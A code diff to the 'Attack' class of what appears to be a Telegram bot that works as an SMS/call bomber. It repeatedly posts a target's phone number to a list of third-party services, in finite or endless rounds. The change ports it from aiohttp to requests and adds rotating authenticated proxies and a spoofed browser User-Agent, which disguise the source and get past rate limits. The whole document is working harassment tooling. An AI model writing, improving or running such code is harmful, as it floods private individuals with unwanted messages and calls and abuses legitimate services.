@@ -1,10 +1,11 @@
-from asyncio import sleep
+from random import choice
+from asyncio import sleep, get_event_loop
 from loguru import logger
 from json import loads
-from aiohttp import ClientSession
 from datetime import datetime as dt
 
-from aiohttp.client_exceptions import ClientConnectionError, ClientOSError, ClientResponseError
+from requests import Session
+from requests.exceptions import ConnectionError, ReadTimeout, SSLError
 from aiogram.types import Message
 
 from objects import globals
@@ -29,10 +30,13 @@ class Attack:
 
         self.phone: str = phone
         self.user_id: int = user_id
-        self.client_session: ClientSession = ClientSession()
         self.process_status: bool = True
         self.state_cirlces: int = 0
         self.user_data = None
+        self.session: Session = Session()
+        self.headers = {"User-Agent":("Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) "
+                "AppleWebKit/537.36 (KHTML, like Gecko) "
+                "Chrome/93.0.4577.63 Safari/537.36")}
 
     async def start(self, message: Message):
         """Start attack
@@ -55,49 +59,45 @@ class Attack:
         else:
             self.state_circles:int = int(circles_status)
 
+        # Load all proxies
+        with open(r"sites/proxies.json") as proxies_load:
+            proxies = loads(proxies_load.read())
+
         # Load all services
         with open(r"sites/services.json") as services_load:
             services = loads(services_load.read())
 
         # Run attack process
         while self.process_status:
+            proxy = choice(list(proxies.keys()))
+            proxy_url = {"http":"http://%s:%s@%s" % (proxies[proxy][0], proxies[proxy][1], proxy,)}
+            self.session.proxies.update(proxy_url)
+            self.session.headers.update(self.headers)
+
             if self.state_circles != "∞":
                 # Update count circles (auto stoping)
                 await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone) 
                 return await message.answer(text=f"❌Атака остановлена\n"f"🗑Количество кругов израсходовано!")
 
             for (k,v) in services.items():
-                if "data" in v.keys():
-                    url = v["url"] % decode_host(k)
-                    _data = (v["data"] % self.phone).replace("'", "\"")
-
-                    try:
-                        await self.client_session.post(url=url, data=loads(_data),
-                                timeout=2)
-                    except (TimeoutError, ClientConnectionError,
-                        ClientOSError, RuntimeError,
-                        TypeError, ClientResponseError):pass
-                elif "json" in v.keys():
-                    url = v["url"] % decode_host(k)
-                    _json = (v["json"] % self.phone).replace("'", "\"")
-
-                    try:
-                        await self.client_session.post(url=url, json=loads(_json),
-                            timeout=2)
-                    except (TimeoutError, ClientConnectionError,
-                            ClientOSError, RuntimeError,
-                            TypeError, ClientResponseError):pass
-                else:
-                    try:
+                try:
+                    if "data" in v.keys():
+                        url = v["url"] % decode_host(k)
+                        data = (v["data"] % self.phone).replace("'", "\"")
+                        self.session.post(url=url, data=data, timeout=2)
+                    elif "json" in v.keys():
+                        url = v["url"] % decode_host(k)
+                        json = (v["json"] % self.phone).replace("'", "\"")
+                        self.session.post(url=url, json=json, timeout=2)
+                    else:
                         url = v["url"] % (decode_host(k), self.phone,) # Url
-                        await self.client_session.post(url=url, timeout=2)
-                    except (TimeoutError, ClientConnectionError,
-                        ClientOSError, RuntimeError,
-                        TypeError, ClientResponseError):pass
+                        self.session.post(url=url, timeout=2)
+                except (ConnectionError, ReadTimeout, UnicodeEncodeError, SSLError):
+                    pass
 
             await sleep(3) # Time-out
-            if circles_status == "∞":pass
-            else:self.state_circles-=1
+            if circles_status != "∞":
+                self.state_circles-=1
 
     async def stop(self):
         """Stop attack"""
